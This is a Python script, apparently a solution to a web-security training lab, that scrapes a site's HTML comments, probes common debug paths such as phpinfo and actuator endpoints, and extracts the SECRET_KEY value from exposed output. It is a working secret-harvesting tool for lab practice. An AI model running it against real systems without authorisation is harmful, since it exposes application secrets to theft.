#!/usr/bin/env python3
# Information disclosure on debug page — free alternative to Burp Pro's
# "Find comments" engagement tool.
#
# What it does:
#   1. Fetches the home page and extracts HTML comments.
#   2. Collects links (href) found inside comments — the lab hides a "Debug"
#      link to /cgi-bin/phpinfo.php in one of them.
#   3. Fetches the candidate debug pages (plus a few common paths as fallback).
#   4. Extracts the SECRET_KEY environment variable from the phpinfo output.
#
# Usage:
#   python3 find_debug_secret.py <host>
#
# Example:
#   python3 find_debug_secret.py 0aeb004504821a3b800494cb00da00f2.web-security-academy.net

import re
import sys
import urllib.error
import urllib.request

COMMON_DEBUG_PATHS = [
    "/cgi-bin/phpinfo.php",
    "/phpinfo.php",
    "/debug",
    "/debug.php",
    "/server-status",
    "/actuator/env",
]


def fetch(url):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.status, resp.read().decode("utf-8", "replace")


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 find_debug_secret.py <host>")
        return 1

    host = sys.argv[1].replace("https://", "").replace("http://", "").strip("/")
    base = "https://" + host

    print("Target: %s\n" % base)

    # 1) home page -> comments -> links inside comments
    status, home = fetch(base + "/")
    comments = re.findall(r"<!--(.*?)-->", home, re.S)
    print("[*] found %d HTML comment(s)" % len(comments))

    candidates = []
    for comment in comments:
        text = re.sub(r"\s+", " ", comment).strip()
        if text:
            print("    <!-- %s -->" % text[:120])
        for href in re.findall(r"""href=["']?([^"'\s>]+)""", comment, re.I):
            if href.startswith("/"):
                candidates.append(href)

    # 2) add common debug paths as a fallback
    for path in COMMON_DEBUG_PATHS:
        if path not in candidates:
            candidates.append(path)

    print("\n[*] checking %d candidate path(s)\n" % len(candidates))

    # 3) fetch candidates and look for SECRET_KEY
    for path in candidates:
        try:
            status, page = fetch(base + path)
        except urllib.error.HTTPError as e:
            if e.code != 404:
                print("[%d] %s" % (e.code, path))
            continue
        except Exception:
            continue

        if status != 404:
            print("[%d] %s" % (status, path))

        m = re.search(r"SECRET_KEY[^<]*</td><td[^>]*>\s*([^<\s]+)", page)
        if not m:
            m = re.search(r"SECRET_KEY['\"]?\]?\s*[=:]\s*['\"]?([A-Za-z0-9]{8,})", page)
        if m:
            print("\n[+] SECRET_KEY: %s" % m.group(1))
            return 0

    print("\n[-] SECRET_KEY not found")
    return 1


if __name__ == "__main__":
    sys.exit(main())
